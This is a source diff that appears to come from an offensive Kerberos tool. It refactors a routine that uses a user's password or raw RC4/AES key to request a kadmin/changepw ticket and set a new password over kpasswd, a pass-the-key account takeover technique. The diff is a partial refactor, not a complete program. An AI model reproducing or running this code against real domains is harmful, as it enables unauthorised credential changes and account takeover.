@@ -34,8 +34,8 @@ BOOL term()
 
 int main(int argc, char * argv[])
 {
-	EncryptionKey userKey;
-	LPCSTR szUser, szDomain, szPassword = NULL, szKey = NULL, szNew;
+	KIWI_AUTH_INFOS authInfo;
+	LPCSTR szNew;
 	LPSTR szWhatDC;
 	
 	kprintf("\n"
@@ -47,54 +47,27 @@ int main(int argc, char * argv[])
 		"  '#####'     ...   with thanks to Aorato / Microsoft   ...   * * */\n\n");
 	if(init())
 	{
-		if(kull_m_string_args_byName(argc, argv, "user", &szUser, NULL))
+		if(kull_m_kerberos_helper_getAuthInfo(argc, argv, &authInfo))
 		{
-			if(kull_m_string_args_byName(argc, argv, "domain", &szDomain, NULL))
+			if(kull_m_string_args_byName(argc, argv, "new", &szNew, NULL))
 			{
-				if(kull_m_string_args_byName(argc, argv, "key", &szKey, NULL) || kull_m_string_args_byName(argc, argv, "password", &szPassword, NULL))
+				if(kull_m_kerberos_helper_net_getDC(authInfo.szDomain, DS_KDC_REQUIRED, &szWhatDC))
 				{
-					if(kull_m_string_args_byName(argc, argv, "aes256", NULL, NULL))
-						userKey.keytype = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
-					else if(kull_m_string_args_byName(argc, argv, "aes128", NULL, NULL))
-						userKey.keytype = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
-					else
-						userKey.keytype = KERB_ETYPE_RC4_HMAC_NT;
-
-					if(kull_m_string_args_byName(argc, argv, "new", &szNew, NULL))
-					{
-						if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
-						{
-							if(kull_m_kerberos_helper_net_getDC(szDomain, DS_KDC_REQUIRED, &szWhatDC))
-							{
-								kprintf("[KDC] \'%s\' will be the main server\n\n"
-									"user     : %s\n"
-									"domain   : %s\n"
-									"password : %s\n"
-									"key      : "
-									, szWhatDC, szUser, szDomain, szKey ? "<NULL>" : "***");
-								kull_m_string_printf_hex(userKey.keyvalue.value, userKey.keyvalue.length, 0);
-								kprintf(" (%s)\n", kull_m_kerberos_asn1_helper_util_etypeToString(userKey.keytype));
-
-								makeInception(szUser, szDomain, szNew, &userKey, szWhatDC, 88, 464);
-								LocalFree(szWhatDC);
-							}
-							LocalFree(userKey.keyvalue.value);
-						}
-					}
-					else PRINT_ERROR("Missing new password\n");
+					kprintf("[KDC] \'%s\' will be the main server\n\n" , szWhatDC);
+					makeInception(&authInfo, szNew, szWhatDC, KERBEROS_DEFAULT_PORT, KADMIN_DEFAULT_PORT);
+					LocalFree(szWhatDC);
 				}
-				else PRINT_ERROR("Missing password/key argument\n");
 			}
-			else PRINT_ERROR("Missing domain argument\n");
+			else PRINT_ERROR("Missing new password\n");
+			kull_m_kerberos_helper_freeAuthInfo(&authInfo);
 		}
-		else PRINT_ERROR("Missing user argument\n");
 	}
 	else PRINT_ERROR("init() failed\n");
 	term();
 	return 0;
 }
 
-void makeInception(PCSTR user, PCSTR domain, PCSTR newpassword, EncryptionKey *key, PCSTR kdc, WORD port, WORD kadminPort)
+void makeInception(PKIWI_AUTH_INFOS authInfo, PCSTR newpassword, PCSTR kdc, WORD port, WORD kadminPort)
 {
 	SOCKET connectSocket, connectSocketAdmin;
 	OssBuf AsReq, ApReq, KrbPrivReq;
@@ -113,14 +86,14 @@ void makeInception(PCSTR user, PCSTR domain, PCSTR newpassword, EncryptionKey *k
 	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
 	{
 		kprintf(" [level 1] Reality       (AS-REQ)\n");
-		if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, key, "kadmin", "changepw", NULL, FALSE, NULL, NULL, &AsReq))
+		if(kull_m_kerberos_asn1_helper_build_AsReq_Generic(authInfo, "kadmin", "changepw", NULL, FALSE, &AsReq))
 		{
 			if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &AsReq, (LPVOID *) &AsRep, AS_REP_PDU))
 			{
-				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(AsRep, &encAsRepPart, key, EncASRepPart_PDU))
+				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_AsRep_Generic(authInfo, AsRep, &encAsRepPart))
 				{
 					kprintf(" [level 2] Van Chase     (AP-REQ)\n");
-					if(kull_m_kerberos_asn1_helper_build_ApReq(&ApReq, user, domain, &AsRep->ticket, &encAsRepPart->key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
+					if(kull_m_kerberos_asn1_helper_build_ApReq(&ApReq, authInfo->szUser, authInfo->szDomain, &AsRep->ticket, &encAsRepPart->key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
 					{
 						kprintf(" [level 3] The Hotel     (KRB-PRIV - REQ)\n");
 						if(kull_m_kerberos_asn1_helper_build_KrbPriv(&password, &authKey, "wtf", &KrbPrivReq, &seq))
